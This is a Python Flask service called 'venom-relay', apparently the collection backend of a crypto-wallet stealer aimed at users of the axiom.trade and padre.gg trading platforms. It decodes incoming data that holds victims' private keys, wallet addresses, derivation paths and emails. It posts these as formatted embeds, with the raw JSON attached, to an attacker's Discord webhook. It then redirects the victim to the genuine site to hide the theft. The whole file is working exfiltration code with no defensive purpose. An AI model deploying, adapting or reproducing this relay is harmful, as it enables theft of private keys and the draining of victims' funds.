# venom-relay — Render Web Service (Python / Flask)
# env vars : DISCORD_WEBHOOK (obligatoire), SECRET (optionnel)
# route    : GET /?data=<base64url>&key=<secret>  |  POST /  (json brut)

import os
import base64
import json
import time
from collections import Counter
from datetime import datetime, timezone

from dotenv import load_dotenv
load_dotenv()

from flask import Flask, request, Response
import requests


app = Flask(__name__)

WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
SECRET  = os.environ.get("SECRET", "")

if not WEBHOOK:
    raise SystemExit("DISCORD_WEBHOOK missing")

PLATFORM_REDIRECTS = {
    "axiom": "https://axiom.trade/",
    "padre": "https://trade.padre.gg/",
}

ALLOWED_HOSTS = ("axiom.trade", "padre.gg")

BRAND       = "Suite Logs"
BRAND_COLOR = 0xF4F4F5   # neutral light
OVERVIEW_COLOR = 0xFAFAFA
WALLET_COLOR   = 0xA1A1AA


def decode_b64url(s: str) -> str:
    b64 = s.replace("-", "+").replace("_", "/")
    b64 += "=" * (-len(b64) % 4)
    return base64.b64decode(b64).decode("utf-8")


def redirect_target(parsed: dict) -> str:
    host = (parsed.get("host") or "").lower()
    platform = (parsed.get("platform") or "").lower()
    for allowed in ALLOWED_HOSTS:
        if host == allowed or host.endswith("." + allowed):
            return f"https://{host}/"
    return PLATFORM_REDIRECTS.get(platform, "https://axiom.trade/")


def done_page(parsed: dict) -> str:
    target = json.dumps(redirect_target(parsed))
    return (
        "<!doctype html><meta charset=utf-8><title>ok</title>"
        "<body style='background:#050a06;color:#4ade80;font:14px system-ui;"
        "display:grid;place-items:center;height:100vh;margin:0'>done</body>"
        "<script>location.replace(" + target + ")</script>"
    )


def normalize_wallets(parsed: dict) -> list:
    """Return a wallet list aligned with keys[]."""
    platform = (parsed.get("platform") or "").lower()
    wallets = parsed.get("wallets") or []
    keys = parsed.get("keys") or []
    addresses = parsed.get("addresses") or []

    if wallets:
        return wallets

    n = max(len(keys), len(addresses))
    if n == 0:
        return []

    default_chain = "SOL" if platform == "padre" else "?"
    stubs = []
    for i in range(n):
        addr = addresses[i] if i < len(addresses) else ""
        stubs.append([addr, default_chain, "", "", "", "", ""])
    return stubs


def chain_breakdown(wallets: list) -> str:
    counts = Counter()
    for w in wallets:
        if not isinstance(w, (list, tuple)) or len(w) < 2:
            continue
        chain = (w[1] or "?").upper() or "?"
        counts[chain] += 1
    if not counts:
        return "—"
    return " · ".join(f"{c}: {n}" for c, n in counts.most_common())


def trunc(s: str, n: int) -> str:
    s = s or ""
    return s if len(s) <= n else s[: n - 1] + "…"


def short_addr(addr: str) -> str:
    a = addr or ""
    if len(a) <= 14:
        return a or "—"
    return f"{a[:6]}…{a[-4:]}"


def build_embeds(parsed: dict) -> list:
    platform = parsed.get("platform", "?")
    host     = parsed.get("host", "?")
    keys     = parsed.get("keys", []) or []
    wallets  = normalize_wallets(parsed)
    user     = parsed.get("user") or {}
    email    = user.get("email") or "—"
    rewards  = user.get("rewardsLevel", "—")

    overview = {
        "author": {"name": BRAND},
        "title":  f"`{host}` — {len(keys)} key{'s' if len(keys) != 1 else ''} recovered",
        "color":  OVERVIEW_COLOR,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "fields": [
            {"name": "Platform", "value": f"`{platform}`", "inline": True},
            {"name": "Host",     "value": f"`{host}`", "inline": True},
            {"name": "Rewards",  "value": f"`{rewards}`", "inline": True},
            {"name": "Email",    "value": f"`{trunc(email, 60)}`", "inline": False},
            {"name": "Keys",     "value": f"`{len(keys)}`", "inline": True},
            {"name": "Wallets",  "value": f"`{len(wallets)}`", "inline": True},
            {"name": "Chains",   "value": f"`{chain_breakdown(wallets)}`", "inline": True},
        ],
        "footer": {"text": f"{BRAND} · v3"},
    }

    embeds = [overview]

    shown = wallets[:9]
    for i, w in enumerate(shown):
        if not isinstance(w, (list, tuple)) or len(w) < 2:
            continue
        addr  = w[0] or ""
        chain = (w[1] or "").upper() or "UNKNOWN"
        label = w[5] if len(w) > 5 else ""
        deriv = w[6] if len(w) > 6 else ""
        key   = keys[i] if i < len(keys) else None

        title_bits = [f"Wallet {i+1}", chain]
        if label:
            title_bits.append(trunc(label, 24))

        fields = [
            {"name": "Address", "value": f"```{addr or '—'}```", "inline": False},
        ]
        meta = []
        if deriv:
            meta.append(f"`{deriv}`")
        if label:
            meta.append(f"`{trunc(label, 40)}`")
        if meta:
            fields.append({"name": "Path · Label", "value": " · ".join(meta), "inline": False})

        if key:
            fields.append({"name": "Private Key", "value": f"```{key}```", "inline": False})
        else:
            fields.append({"name": "Private Key", "value": "`not recovered`", "inline": False})

        embeds.append({
            "title": " — ".join(title_bits),
            "color": WALLET_COLOR,
            "fields": fields,
            "footer": {"text": f"{chain} · {short_addr(addr)}"},
        })

    if len(wallets) > 9:
        overview["fields"].append({
            "name": "Note",
            "value": f"`+{len(wallets) - 9}` wallets in attached JSON",
            "inline": False,
        })

    return embeds


def forward(parsed: dict, payload: str) -> Response:
    files = {
        "files[0]": (
            f"suite-logs-{int(time.time()*1000)}.json",
            payload.encode("utf-8"),
            "application/json",
        )
    }
    data = {"payload_json": json.dumps({"embeds": build_embeds(parsed)})}

    try:
        r = requests.post(WEBHOOK, data=data, files=files, timeout=15)
    except requests.RequestException as e:
        return Response(f"fetch failed: {e}", status=500)

    if not r.ok:
        return Response(
            f"discord {r.status_code} {r.text[:300]}",
            status=502,
            mimetype="text/plain",
        )

    return Response(done_page(parsed), mimetype="text/html")


@app.get("/")
def root():
    raw = request.args.get("data")
    if not raw:
        return Response("ok", mimetype="text/plain")

    if SECRET and request.args.get("key") != SECRET:
        return Response("forbidden", status=403, mimetype="text/plain")

    try:
        payload = decode_b64url(raw)
        parsed = json.loads(payload)
    except Exception as e:
        return Response(f"bad payload: {e}", status=400, mimetype="text/plain")

    return forward(parsed, payload)


@app.post("/")
def post_root():
    if SECRET and request.args.get("key") != SECRET:
        return Response("forbidden", status=403, mimetype="text/plain")

    payload = request.get_data(as_text=True) or ""
    try:
        parsed = json.loads(payload)
    except Exception:
        return Response("bad json", status=400, mimetype="text/plain")

    return forward(parsed, payload)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 1000))
    app.run(host="0.0.0.0", port=port)
